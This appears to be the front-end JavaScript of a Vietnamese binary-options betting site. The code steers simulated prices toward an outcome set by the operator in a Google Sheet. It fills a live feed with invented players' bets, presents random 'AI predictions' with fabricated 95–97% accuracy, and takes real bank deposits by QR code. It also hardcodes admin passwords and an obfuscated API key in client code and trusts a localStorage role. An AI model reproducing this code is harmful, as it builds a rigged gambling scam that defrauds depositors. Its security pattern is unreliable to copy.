/**
 * NMT VIP BO - JAVASCRIPT CORE (VERSION 5.0 - FULL CLOUD SYNC)
 * Đã sửa lỗi trùng hàm, xóa bỏ LocalStorage và tối ưu bảo mật.
 */

// --- 1. STATE & BIẾN TOÀN CỤC ---
const _0xkey = "TllUX1NFQ1JFVF8yMDI2"; // Mã hóa Base64 của NMT_SECRET_2026
const API_KEY = atob(_0xkey); 
const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbzENF5j2O8npZIRGKr_a7RGYnJwWB8v5sv8ThsvwxPSmJ8ykQDaT4ws4EW9kbQSkc-S/exec";
const EXCHANGE_RATE = 25000;

let state = {
    usdBalance: 0.00,
    realizedPnL: 0,
    history: [],
    dotHistory: [],
    winStreak: 0,
    currentStreakType: null,
    totalVolume: 0
};

let currentPrice = 100.00;
let volatility = 0; // Thêm biến biến động để dùng trong simulateMarket
let isBoRunning = false;
let currentBetDirection = null;
let betEntryPrice = 0;
let activeAIPrediction = null;

// --- ÂM THANH BÁO KẾT QUẢ ---
const winSound = new Audio('https://quicksounds.com/uploads/tracks/1149463990_1215160074_1349386407.mp3');
const loseSound = new Audio('https://www.myinstants.com/media/sounds/wrong-answer-sound-effect.mp3');
const fakeNames = ["Nguyễn Hải", "Trần Tuấn", "Lê Nam", "Phạm Quân", "Hoàng Linh", "Vũ Thảo", "Đặng Long", "Bùi Phát", "Võ Cường", "Phan Anh"];

// --- 2. ĐỒNG BỘ DỮ LIỆU ĐÁM MÂY (CHỈ DÙNG CLOUD - KHÔNG LOCALSTORAGE) ---

async function syncFromCloud() {
    const session = JSON.parse(localStorage.getItem('nmt_session'));
    if (!session) {
        window.location.href = 'login.html';
        return;
    }

    try {
        console.log("🔄 Đang lấy dữ liệu thực tế từ Cloud...");
        const response = await fetch(GOOGLE_SHEET_URL);
        const data = await response.json();
        
        if (data.status === "success") {
            const user = data.users.find(u => u.id === session.id);
            if (user) {
                state.usdBalance = parseFloat(user.balance);
                updateUI();
                console.log("✅ Đồng bộ thành công số dư Cloud: $" + state.usdBalance);
            }
        }
    } catch (e) {
        console.warn("⚠️ Lỗi kết nối Cloud, đang thử lại...");
    }
}

// Hàm gửi dữ liệu duy nhất (Đã gộp và sửa lỗi no-cors)
async function sendToGoogleSheets(action, amount, result, profit_loss, balance, note) {
    const session = JSON.parse(localStorage.getItem('nmt_session')) || { id: 'Khách', hash: 'Unknown' };

    const data = {
        api_key: API_KEY,
        time: new Date().toLocaleString("vi-VN"),
        action: action,
        amount: amount,
        result: result,
        pnl: profit_loss,
        balance: balance,
        note: note,
        player_id: session.id,
        hash_pass: session.hash
    };

    try {
        // Sử dụng POST để cập nhật dữ liệu
        await fetch(GOOGLE_SHEET_URL, {
            method: "POST",
            mode: "no-cors", // Dùng no-cors để tránh lỗi trình duyệt chặn gửi dữ liệu
            headers: { "Content-Type": "text/plain;charset=utf-8" },
            body: JSON.stringify(data)
        });
        console.log("✅ Đã đồng bộ giao dịch lên hệ thống đám mây.");
    } catch (err) {
        console.error("❌ Lỗi mạng: Không thể gửi dữ liệu lên Sheets:", err);
    }
}

// Xóa bỏ lưu trữ máy khách - Hàm saveData giờ chỉ cập nhật UI
function saveData() {
    updateUI();
}

// --- 3. MÔ PHỎNG THỊ TRƯỜNG & THAO TÚNG AI ---
let cloudBotDirection = null;

async function fetchCloudBot() {
    try {
        const res = await fetch(GOOGLE_SHEET_URL);
        const data = await res.json();
        if (data.bot_prediction) {
            cloudBotDirection = data.bot_prediction;
            console.log("🤖 Cloud Bot đang báo:", cloudBotDirection);
        }
    } catch (e) { }
}

setInterval(fetchCloudBot, 3000);

function simulateMarket() {
    volatility = (Math.random() - 0.5) * 0.2;

    if (isBoRunning) {
        const targetDirection = cloudBotDirection || activeAIPrediction;
        if (targetDirection) {
            const isAIHit = Math.random() <= 0.95; // 95% đi theo Bot
            if (targetDirection === 'UP') {
                volatility = isAIHit ? Math.abs(volatility) + 0.005 : -Math.abs(volatility);
            } else {
                volatility = isAIHit ? -Math.abs(volatility) - 0.005 : Math.abs(volatility);
            }
        }
    }
    
    currentPrice += volatility;
    updateOrderBook();
}

function updateOrderBook() {
    const hp = document.getElementById('header-price');
    if (!hp) return;
    hp.innerText = currentPrice.toFixed(2);

    const obPriceEl = document.getElementById('ob-price');
    if (obPriceEl) {
        obPriceEl.innerText = currentPrice.toFixed(2);
        obPriceEl.className = (volatility > 0) ? 'ob-current-price price-up' : 'ob-current-price price-down';
    }
}

// --- 4. NGƯỜI CHƠI ẢO & AI ---

function generateFakeBet() {
    if (Math.random() > 0.4 || isBoRunning) return;
    const name = fakeNames[Math.floor(Math.random() * fakeNames.length)] + "***";
    const amount = (Math.random() * 800 + 50).toFixed(0);
    const feed = document.getElementById('live-feed');
    if (!feed) return;
    const item = document.createElement('div');
    item.className = 'feed-item';
    item.innerHTML = `<strong>${name}</strong> cược <span style="color:var(--accent)">$${amount}</span> 💸`;
    feed.prepend(item);
    if (feed.children.length > 10) feed.lastChild.remove();
}

function getAIPrediction() {
    if (isBoRunning) return;
    const btn = document.getElementById('btn-predict');
    const resultBox = document.getElementById('ai-result');

    btn.disabled = true;
    btn.innerHTML = "⏳ Đang quét khối lượng giao dịch...";
    resultBox.style.display = 'block';
    resultBox.innerHTML = "Đang kết nối siêu máy tính...";

    setTimeout(() => {
        const isUp = Math.random() > 0.5;
        activeAIPrediction = isUp ? 'UP' : 'DOWN';
        const accuracy = (Math.random() * 2 + 95).toFixed(2);

        btn.innerHTML = "🤖 Phân Tích Lại";
        btn.disabled = false;
        resultBox.innerHTML = `🔥 AI khuyên: <strong style="color:${isUp ? 'var(--green)' : 'var(--red)'}">${isUp ? 'TĂNG 📈' : 'GIẢM 📉'}</strong><br>Tỉ lệ thắng: ${accuracy}%`;
    }, 1500);
}

// --- 5. LOGIC GIAO DỊCH (BO) ---

async function placeBO(direction) {
    if (isBoRunning) return;
    const betAmount = parseFloat(document.getElementById('bo-amount').value);

    if (isNaN(betAmount) || betAmount < 1) return alert("Cược tối thiểu $1");

    // BUỘC ĐỒNG BỘ TRƯỚC KHI CƯỢC ĐỂ CHỐNG HACK LOCAL
    await syncFromCloud();

    if (betAmount > state.usdBalance) return alert("Số dư trên Cloud không đủ!");

    isBoRunning = true;
    currentBetDirection = direction;
    betEntryPrice = currentPrice;
    state.usdBalance -= betAmount; // Trừ tạm thời để hiển thị UI

    document.querySelectorAll('.btn-huge, #btn-predict').forEach(b => b.disabled = true);
    
    // Progress Bar hiệu ứng
    const progressBar = document.getElementById('countdown-bar');
    progressBar.style.transition = 'none';
    progressBar.style.width = '100%';
    setTimeout(() => {
        progressBar.style.transition = 'width 5s linear';
        progressBar.style.width = '0%';
    }, 50);

    let timeLeft = 5;
    const countdown = setInterval(() => {
        timeLeft--;
        document.getElementById('bo-status').innerHTML = `Kết quả sau: ${timeLeft}s<br>Vào lệnh: ${betEntryPrice.toFixed(2)}`;
        if (timeLeft <= 0) {
            clearInterval(countdown);
            resolveBO(direction, betAmount, betEntryPrice);
        }
    }, 1000);
    updateUI();
}

function resolveBO(direction, betAmount, entryPrice) {
    const exitPrice = currentPrice;
    let isWin = false, isTie = false, resultText = 'HÒA', profit = 0;

    if (exitPrice > entryPrice) {
        state.dotHistory.push('up');
        if (direction === 'UP') isWin = true;
    } else if (exitPrice < entryPrice) {
        state.dotHistory.push('down');
        if (direction === 'DOWN') isWin = true;
    } else {
        state.dotHistory.push('tie');
        isTie = true;
    }

    if (state.dotHistory.length > 56) state.dotHistory.shift();
    let note = activeAIPrediction ? "Dùng Bot AI " + activeAIPrediction : "Cược tay";

    if (isWin) {
        winSound.play().catch(e => console.log("Sound block"));
        profit = betAmount * 0.95;
        state.usdBalance += (betAmount + profit);
        state.realizedPnL += profit;
        resultText = "THẮNG";
        showFloatingText(`+$${profit.toFixed(2)}`, 'var(--green)');
    } else if (isTie) {
        state.usdBalance += betAmount;
        resultText = "HÒA";
    } else {
        loseSound.play().catch(e => console.log("Sound block"));
        profit = -betAmount;
        state.realizedPnL -= betAmount;
        resultText = "THUA";
        showFloatingText(`-$${betAmount}`, 'var(--red)');
    }

    state.history.unshift({ action: direction, amount: profit, price: entryPrice, result: resultText, time: new Date().toLocaleTimeString() });
    state.totalVolume += betAmount;

    // Cập nhật số dư cuối cùng lên Cloud
    sendToGoogleSheets(`Cược ${direction}`, betAmount, resultText, profit.toFixed(2), state.usdBalance.toFixed(2), note);

    isBoRunning = false;
    activeAIPrediction = null;
    document.querySelectorAll('.btn-huge, #btn-predict').forEach(b => b.disabled = false);
    updateUI();
}

// --- 6. CẬP NHẬT GIAO DIỆN ---

function updateUI() {
    const fmt = (n) => "$" + n.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });

    document.getElementById('usd-balance').innerText = fmt(state.usdBalance);
    document.getElementById('total-asset').innerText = fmt(state.usdBalance);

    const pnlEl = document.getElementById('realized-pnl');
    if (pnlEl) {
        pnlEl.innerText = fmt(state.realizedPnL);
        pnlEl.style.color = state.realizedPnL >= 0 ? 'var(--green)' : 'var(--red)';
    }

    // LOGIC VIP
    let vip = "VIP 0", color = "var(--text-muted)";
    const vol = state.totalVolume;
    if (vol >= 1000000000) { vip = "VIP MAX (VÔ CỰC)"; color = "#ff00ff"; }
    else if (vol >= 100000000) { vip = "VIP 9 (Chúa Tể)"; color = "#ff4500"; }
    else if (vol >= 10000000) { vip = "VIP 8 (Huyền Thoại)"; color = "#ff8c00"; }
    else if (vol >= 1000000) { vip = "VIP 7 (Thách Đấu)"; color = "#ffd700"; }
    else if (vol >= 500000) { vip = "VIP 6 (Tinh Anh)"; color = "#00fa9a"; }
    else if (vol >= 100000) { vip = "VIP 5 (Kim Cương)"; color = "#00ffff"; }
    else if (vol >= 50000) { vip = "VIP 4 (Bạch Kim)"; color = "#dda0dd"; }
    else if (vol >= 20000) { vip = "VIP 3 (Vàng)"; color = "var(--accent)"; }
    else if (vol >= 10000) { vip = "VIP 2 (Bạc)"; color = "#c0c0c0"; }
    else if (vol >= 1000) { vip = "VIP 1 (Đồng)"; color = "#cd7f32"; }

    const logoEl = document.querySelector('.logo');
    if (logoEl) {
        logoEl.innerHTML = `💎 NMT BO - <span style="color:${color}; font-size:12px; font-weight:bold;">${vip}</span>`;
    }

    document.getElementById('dot-history').innerHTML = state.dotHistory.map(d => `<div class="dot ${d}"></div>`).join('');
    document.getElementById('history-body').innerHTML = state.history.slice(0, 15).map(h => `
        <div class="hist-item ${h.result === 'THẮNG' ? 'win' : (h.result === 'THUA' ? 'loss' : '')}">
            <div class="hist-left"><strong>${h.action}</strong><small>${h.time}</small></div>
            <div class="hist-right">${h.amount >= 0 ? '+' : ''}${h.amount.toFixed(2)}</div>
        </div>
    `).join('');
}

function showFloatingText(text, color) {
    const el = document.createElement('div');
    el.className = 'floating-text';
    el.style.color = color; el.innerText = text;
    const container = document.getElementById('floating-container');
    if (container) container.appendChild(el);
    setTimeout(() => el.remove(), 2000);
}

// --- 7. NẠP TIỀN ---

function openDepositModal() {
    document.getElementById('deposit-modal').style.display = 'flex';
    backToStep1();
}

function closeDepositModal() {
    document.getElementById('deposit-modal').style.display = 'none';
}

function calculateVND() {
    const usd = document.getElementById('deposit-amount').value;
    const vnd = usd * EXCHANGE_RATE;
    document.getElementById('vnd-preview').innerText = vnd.toLocaleString() + " ₫";
}

function goToDepositStep2() {
    const usd = parseFloat(document.getElementById('deposit-amount').value);
    if (isNaN(usd) || usd < 10) return alert("Vui lòng nạp tối thiểu $10");

    const vndAmount = usd * EXCHANGE_RATE;
    const memo = "NAPUSD" + Math.floor(1000 + Math.random() * 9000);

    document.getElementById('qr-vnd-amount').innerText = vndAmount.toLocaleString() + " ₫";
    document.getElementById('qr-memo').innerText = memo;
    document.getElementById('qr-image').src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=STK:123456789|Amount:${vndAmount}|Memo:${memo}`;

    document.getElementById('deposit-step-1').style.display = 'none';
    document.getElementById('deposit-step-2').style.display = 'block';
}

function backToStep1() {
    document.getElementById('deposit-step-1').style.display = 'block';
    document.getElementById('deposit-step-2').style.display = 'none';
    document.getElementById('deposit-loader').style.display = 'none';
}

function processDeposit() {
    const usd = parseFloat(document.getElementById('deposit-amount').value);
    const btnConfirm = document.getElementById('btn-confirm-deposit');
    const loader = document.getElementById('deposit-loader');

    btnConfirm.disabled = true;
    loader.style.display = 'block';

    setTimeout(() => {
        state.usdBalance += usd;
        state.history.unshift({ action: 'NẠP', amount: usd, price: '-', result: 'THẮNG', time: new Date().toLocaleTimeString() });

        sendToGoogleSheets('NẠP TIỀN', usd, 'THÀNH CÔNG', `+${usd}`, state.usdBalance.toFixed(2), "Nạp qua QR");

        updateUI();
        closeDepositModal();
        showFloatingText(`+$${usd}`, 'var(--green)');

        btnConfirm.disabled = false;
        loader.style.display = 'none';
        document.getElementById('deposit-amount').value = '';
    }, 2000);
}

function resetAccount() {
    if (confirm("Bạn có chắc chắn muốn xóa toàn bộ dữ liệu và khôi phục số dư từ Cloud?")) {
        syncFromCloud();
    }
}

function setQuickBet(amt) {
    document.getElementById('bo-amount').value = (amt === 'ALL') ? Math.floor(state.usdBalance) : amt;
    updateExpectedProfit();
}

function updateExpectedProfit() {
    const amt = parseFloat(document.getElementById('bo-amount').value) || 0;
    const profit = amt * 1.95;
    document.getElementById('expected-profit-text').innerText = "$" + profit.toLocaleString(undefined, { minimumFractionDigits: 2 });
}

function switchSidebarTab(tabId) {
    document.querySelectorAll('.tab-btn, .tab-content').forEach(el => el.classList.remove('active'));
    event.currentTarget.classList.add('active');
    document.getElementById(`tab-${tabId}`).classList.add('active');
}

// --- KHỞI ĐỘNG ---
syncFromCloud(); // Khởi chạy bằng Cloud
setInterval(simulateMarket, 1000);
setInterval(generateFakeBet, 2500);

function logOut() {
    localStorage.removeItem('nmt_session');
    window.location.href = 'login.html';
}

if (document.getElementById('user-display')) {
    const session = JSON.parse(localStorage.getItem('nmt_session'));
    document.getElementById('user-display').innerText = session ? session.name : "Khách";
}

function checkAdminBeforeDeposit() {
    const session = JSON.parse(localStorage.getItem('nmt_session'));
    if (session && session.role === 'admin') {
        openDepositModal();
    } else {
        document.getElementById('admin-secret-key').value = '';
        document.getElementById('admin-auth-modal').style.display = 'flex';
    }
}

function verifyAdminKey() {
    const key = document.getElementById('admin-secret-key').value;
    if (key === "adminnạp") {
        document.getElementById('admin-auth-modal').style.display = 'none';
        openDepositModal();
    } else {
        alert("❌ Mật khẩu quản trị sai!");
    }
}

function checkBotAIAccess() {
    const session = JSON.parse(localStorage.getItem('nmt_session'));
    if (session && session.role === 'admin') {
        window.open('bot.html', '_blank');
    } else {
        document.getElementById('ai-secret-key').value = '';
        document.getElementById('ai-auth-modal').style.display = 'flex';
    }
}

function verifyAIPassword() {
    const key = document.getElementById('ai-secret-key').value;
    if (key === "botvip2026") {
        document.getElementById('ai-auth-modal').style.display = 'none';
        window.open('bot.html', '_blank');
    } else {
        alert("❌ Mã kích hoạt không hợp lệ!");
    }
}